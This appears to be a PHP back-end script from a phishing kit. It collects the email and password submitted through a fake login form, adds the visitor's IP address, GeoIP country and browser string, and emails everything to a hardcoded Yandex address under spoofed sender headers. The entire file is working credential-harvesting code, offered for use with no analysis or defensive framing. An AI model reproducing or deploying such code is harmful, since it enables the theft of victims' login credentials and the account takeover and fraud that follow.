<?php

function getrealip()
{
    if (isset($_SERVER)) {
        if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
            if (strpos($ip, ",")) {
                $exp_ip = explode(",", $ip);
                $ip = $exp_ip[0];
            }
        } elseif (isset($_SERVER["HTTP_CLIENT_IP"])) {
            $ip = $_SERVER["HTTP_CLIENT_IP"];
        } else {
            $ip = $_SERVER["REMOTE_ADDR"];
        }
    } else {
        if (getenv('HTTP_X_FORWARDED_FOR')) {
            $ip = getenv('HTTP_X_FORWARDED_FOR');
            if (strpos($ip, ",")) {
                $exp_ip=explode(",", $ip);
                $ip = $exp_ip[0];
            }
        } elseif (getenv('HTTP_CLIENT_IP')) {
            $ip = getenv('HTTP_CLIENT_IP');
        } else {
            $ip = getenv('REMOTE_ADDR');
        }
    }
    return $ip;
}


$MyipAddress = getrealip();

// include the php script

include("geoip.inc");

// open the geoip database
$gi = geoip_open("GeoIP.dat", GEOIP_STANDARD);

// to get country code

$country_code = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// to get country name

$country_name = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);

// close the database

geoip_close($gi);

if (isset($_POST['email']) and isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $from = 'From: $textfield';
    $to = 'martin.daniels@yandex.com'; //email
    $subject = "DB Info FrOm $email";
    $message = "<p>=================== ++ =================== \n<br> 
        Email: $email \n<br> ----------------------------------------------------- \n<br>
        Password: $password \n<br> ----------------------------------------------------- \n<br> 
        IP Address: $MyipAddress \n<br> ----------------------------------------------------- \n<br> 
        Country Code: $country_code \n<br> ----------------------------------------------------- \n<br> 
        Country Name: $country_name \n<br> ----------------------------------------------------- \n<br> 
        Browser: $browser \n<br>
        =================== ++ =================== \n<br>
        =================== ++ =================== \n<br> </p>";
    
    
    $headers[] = 'MIME-Version: 1.0';
    $headers[] = 'Content-type: text/html';
    $headers[] = 'From: mylife@mylife.com';
    $headers[] = 'Reply-To: mylife@mylife.com';
    
    mail($to, $subject, $message, implode("\r\n", $headers));
}